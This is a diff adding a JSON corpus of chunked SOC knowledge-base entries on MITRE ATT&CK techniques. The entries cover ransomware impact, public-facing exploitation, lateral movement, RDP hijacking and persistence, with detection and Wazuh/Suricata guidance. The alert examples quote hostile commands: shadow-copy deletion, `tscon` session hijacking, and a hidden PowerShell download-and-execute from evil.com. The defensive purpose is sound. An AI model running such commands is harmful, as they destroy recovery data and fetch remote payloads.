+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Related Techniques\n- T1490: Inhibit System Recovery\n- T1489: Service Stop",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-16",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Example Alert Context\nWazuh generates a critical alert after detecting the execution of `vssadmin.exe delete shadows /all /quiet`, followed by 10,000 file modification events in the `C:\\Users` directory within two minutes.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-17",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Wazuh Relevance\nWazuh is highly effective at detecting the precursor commands (inhibiting recovery) and the rapid file modification behavior via its FIM module.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-18",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Suricata Relevance\nSuricata cannot detect local file encryption. It may detect the ransomware downloading its encryption keys from a C2 server or the initial ingress of the ransomware payload.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exfiltration_impact_t1041_t1486.md",
+    "chunk_id": "mitre-exfiltration_impact_t1041_t1486-chunk-19",
+    "title": "Exfiltration Over C2 Channel",
+    "text": "## Investigation Guidance\nIsolate the infected host immediately to prevent encryption of network shares. Do not reboot the machine, as some ransomware completes encryption upon reboot or deletes the encryption keys from memory.",
+    "topic": "Data Exfiltration",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1041",
+      "T1567",
+      "T1020",
+      "T1486",
+      "T1490",
+      "T1489"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-0",
+    "title": "Exploit Public-Facing Application",
+    "text": "# Exploit Public-Facing Application\n\n**Technique ID:** T1190\n**Tactic:** Initial Access",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-1",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Description\nAdversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration. Common targets include web servers, SMB, SSH, RDP, and database servers.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-2",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Attacker Behavior\nAttackers scan the external perimeter for exposed services and vulnerabilities. They send specially crafted packets, payloads, or HTTP requests designed to trigger buffer overflows, SQL injection, remote code execution (RCE), or path traversal vulnerabilities to gain unauthorized access or execute arbitrary code.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-3",
+    "title": "Exploit Public-Facing Application",
+    "text": "## SOC Evidence\n- High volume of blocked or dropped traffic from a single IP address against an edge firewall.\n- Web Application Firewall (WAF) alerts triggering on SQL injection or cross-site scripting (XSS) patterns.\n- Suricata/Snort alerts indicating known CVE exploitation attempts.\n- Suspicious child processes (like `cmd.exe` or `sh`) spawned by a web server process (e.g., `w3wp.exe`, `nginx`, `httpd`).",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-4",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Detection Clues\nLook for unexpected error logs in public-facing applications. Monitor for unusual process execution chains originating from web server accounts (e.g., `www-data` or `IIS APPPOOL`). Correlate incoming network traffic with internal host behavior to identify successful exploitation.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-5",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Related Techniques\n- T1078: Valid Accounts\n- T1133: External Remote Services\n- T1505: Server Software Component",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-6",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Example Alert Context\nA Suricata alert flags an incoming HTTP POST request containing a known exploit payload for Apache Log4j (CVE-2021-44228). Wazuh then detects the `java` process on the targeted server spawning a reverse shell via `bash -i`.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-7",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Wazuh Relevance\nWazuh monitors process creation and file integrity. It can detect the post-exploitation behavior resulting from a successful T1190 attack, such as a web server daemon unexpectedly launching a shell.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-8",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Suricata Relevance\nSuricata is a primary defense against T1190. It inspects inbound application layer traffic against a database of known exploit signatures to detect the initial intrusion attempt before it reaches the application logic.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "exploit_t1190.md",
+    "chunk_id": "mitre-exploit_t1190-chunk-9",
+    "title": "Exploit Public-Facing Application",
+    "text": "## Investigation Guidance\nDetermine if the exploit attempt was successful by checking endpoint logs for suspicious process execution immediately following the network alert. Identify the specific vulnerability targeted and ensure the application is patched. If compromised, isolate the server and conduct a full forensic review.",
+    "topic": "Exploitation",
+    "platform": "Suricata NIDS",
+    "techniques": [
+      "T1190",
+      "T1078",
+      "T1133",
+      "T1505",
+      "T1190",
+      "T1190"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-0",
+    "title": "Remote Services",
+    "text": "# Remote Services\n\n**Technique ID:** T1021\n**Tactic:** Lateral Movement",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-1",
+    "title": "Remote Services",
+    "text": "## Description\nAdversaries may use Valid Accounts to log into a service specifically designed to accept remote connections, such as SMB, RDP, SSH, or WinRM. This allows them to move laterally across the network and execute commands on remote systems.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-2",
+    "title": "Remote Services",
+    "text": "## Attacker Behavior\nAfter compromising credentials on one host, attackers use tools like PsExec over SMB (TCP 445), native RDP (TCP 3389), or SSH (TCP 22) to access other internal servers and workstations, spreading their footprint.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-3",
+    "title": "Remote Services",
+    "text": "## SOC Evidence\n- Windows Event ID 4624 (Logon Type 3 for Network/SMB or Logon Type 10 for RDP).\n- Execution of `psexec.exe` or creation of the `PSEXESVC` service on a remote host.\n- Network traffic flows indicating RDP or SSH connections between internal workstation subnets (which is often anomalous).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-4",
+    "title": "Remote Services",
+    "text": "## Detection Clues\nLook for administrative logins (Logon Type 3) originating from non-administrative jump boxes. Monitor for the creation of known lateral movement services like `PSEXESVC`. Baseline normal internal remote access patterns to spot deviations.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-5",
+    "title": "Remote Services",
+    "text": "## Related Techniques\n- T1078: Valid Accounts\n- T1563: Remote Service Session Hijacking",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-6",
+    "title": "Remote Services",
+    "text": "## Example Alert Context\nAn alert fires when Suricata detects SMB traffic containing the signature for PsExec, and Wazuh simultaneously logs a Logon Type 3 event on a Domain Controller followed by the installation of the `PSEXESVC` service.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-7",
+    "title": "Remote Services",
+    "text": "## Wazuh Relevance\nWazuh monitors authentication logs for anomalous lateral movement patterns (e.g., unexpected Logon Type 3 or 10 events) and monitors the system for the creation of temporary services often associated with remote execution tools.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-8",
+    "title": "Remote Services",
+    "text": "## Suricata Relevance\nSuricata is highly relevant here. It can detect protocol anomalies, identify specific lateral movement tools crossing the wire (like PsExec SMB signatures), and monitor for internal port scanning preceding the remote connection.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-9",
+    "title": "Remote Services",
+    "text": "## Investigation Guidance\nIdentify the source host initiating the remote service connection; this host is likely already compromised. Determine what commands or payloads were executed on the destination host after the remote session was established.\n\n---",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-10",
+    "title": "Remote Services",
+    "text": "# Remote Service Session Hijacking\n\n**Technique ID:** T1563\n**Tactic:** Lateral Movement",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-11",
+    "title": "Remote Services",
+    "text": "## Description\nAdversaries may hijack a legitimate user's remote session (e.g., RDP or SSH) to move laterally within an environment. This allows the attacker to assume the identity and privileges of the logged-in user without needing to know their password.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-12",
+    "title": "Remote Services",
+    "text": "## Attacker Behavior\nAn attacker with SYSTEM privileges uses tools like `tscon.exe` on Windows to forcefully connect to another user's disconnected or active RDP session.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-13",
+    "title": "Remote Services",
+    "text": "## SOC Evidence\n- Windows Event ID 4778 (A session was reconnected to a Window Station).\n- Execution of `tscon.exe` with a destination session ID.\n- Processes spawning within an RDP session that was inactive for hours.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-14",
+    "title": "Remote Services",
+    "text": "## Detection Clues\nMonitor for the execution of `tscon.exe` from a command prompt running as SYSTEM. Look for session reconnect events that occur immediately after a privilege escalation event.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-15",
+    "title": "Remote Services",
+    "text": "## Related Techniques\n- T1021: Remote Services\n- T1078: Valid Accounts",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-16",
+    "title": "Remote Services",
+    "text": "## Example Alert Context\nWazuh alerts on a Sysmon Event ID 1 showing `tscon.exe 2 /dest:console` executed by the `NT AUTHORITY\\SYSTEM` account, indicating an RDP hijacking attempt.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-17",
+    "title": "Remote Services",
+    "text": "## Wazuh Relevance\nWazuh captures process creation logs and can specifically alert on `tscon.exe` abuse. It also monitors authentication events like session reconnections (Event 4778).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-18",
+    "title": "Remote Services",
+    "text": "## Suricata Relevance\nSuricata cannot detect session hijacking directly, as it occurs internally on the host operating system without generating distinct network signatures beyond normal RDP traffic.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "lateral_movement_t1021_t1563.md",
+    "chunk_id": "mitre-lateral_movement_t1021_t1563-chunk-19",
+    "title": "Remote Services",
+    "text": "## Investigation Guidance\nIdentify which user session was hijacked and trace their subsequent actions. The attacker gains the privileges of the hijacked user, so look for access to sensitive files or further lateral movement from that user's context.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1021",
+      "T1078",
+      "T1563",
+      "T1563",
+      "T1021",
+      "T1078"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-0",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "# Boot or Logon Autostart Execution\n\n**Technique ID:** T1547\n**Tactic:** Persistence, Privilege Escalation",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-1",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Description\nAdversaries may configure system settings to automatically execute a program during system boot or user logon to maintain persistence or gain higher-level privileges. Common mechanisms include Windows Registry Run keys, Startup folders, and modification of system configuration files like `/etc/rc.local` or `.bash_profile` on Linux.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-2",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Attacker Behavior\nAttackers place malicious executables or scripts in autostart locations or modify existing registry keys (e.g., `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`) to ensure their malware survives reboots and executes in the context of the logging-in user or the system itself.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-3",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## SOC Evidence\n- Creation or modification of known autostart registry keys.\n- File creation events in `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`.\n- Modifications to Linux profile scripts or systemd service files.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-4",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Detection Clues\nMonitor Sysmon Event ID 12, 13, and 14 for Registry modifications targeting Run/RunOnce keys. Look for unsigned or suspiciously named binaries being added to startup folders. Baseline typical autostart configurations to identify anomalies.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-5",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Related Techniques\n- T1543: Create or Modify System Process\n- T1037: Boot or Logon Initialization Scripts",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-6",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Example Alert Context\nA SOC alert fires when `reg.exe` is used to add a new string value pointing to `C:\\Users\\Public\\svchost.exe` within the `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-7",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Wazuh Relevance\nWazuh's File Integrity Monitoring (FIM) and Syscheck modules can easily detect changes to critical registry keys and startup directories, generating high-severity alerts when persistence mechanisms are established.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-8",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Suricata Relevance\nSuricata generally does not detect local persistence mechanisms directly, as this behavior occurs entirely on the endpoint without generating specific network signatures.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-9",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Investigation Guidance\nVerify the integrity and digital signature of the newly configured autostart executable. Check if the parent process that created the persistence mechanism is a known administrative tool or something suspicious like a macro-enabled Word document. Remove the registry key and quarantine the executable.\n\n---",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-10",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "# Scheduled Task/Job\n\n**Technique ID:** T1053\n**Tactic:** Execution, Persistence, Privilege Escalation",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-11",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Description\nAdversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities like `schtasks` on Windows or `cron` on Linux allow users to schedule programs or scripts to run at specific times or context.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-12",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Attacker Behavior\nAttackers create scheduled tasks to execute a beacon or reverse shell on a regular cadence (e.g., every 5 minutes). They may also use scheduled tasks running as `SYSTEM` or `root` to elevate privileges.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-13",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## SOC Evidence\n- Command line usage of `schtasks.exe /create` or `crontab -e`.\n- Windows Security Event ID 4698 (A scheduled task was created).\n- Suspicious XML files dropped in `C:\\Windows\\System32\\Tasks`.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-14",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Detection Clues\nFocus on the creation of scheduled tasks by non-administrative users or tasks that execute anomalous binaries (e.g., `powershell.exe`, `cmd.exe`, or binaries in user `AppData` directories).",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-15",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Related Techniques\n- T1078: Valid Accounts\n- T1543: Create or Modify System Process",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-16",
+    "title": "Boot or Logon Autostart Execution",
+    "text": "## Example Alert Context\nAn alert is triggered when a scheduled task named \"WindowsUpdateCheck\" is created via command line, configured to execute `powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` every 10 minutes.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1547",
+      "T1543",
+      "T1037",
+      "T1053",
+      "T1078",
+      "T1543"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "persistence_t1547_t1053.md",
+    "chunk_id": "mitre-persistence_t1547_t1053-chunk-17",
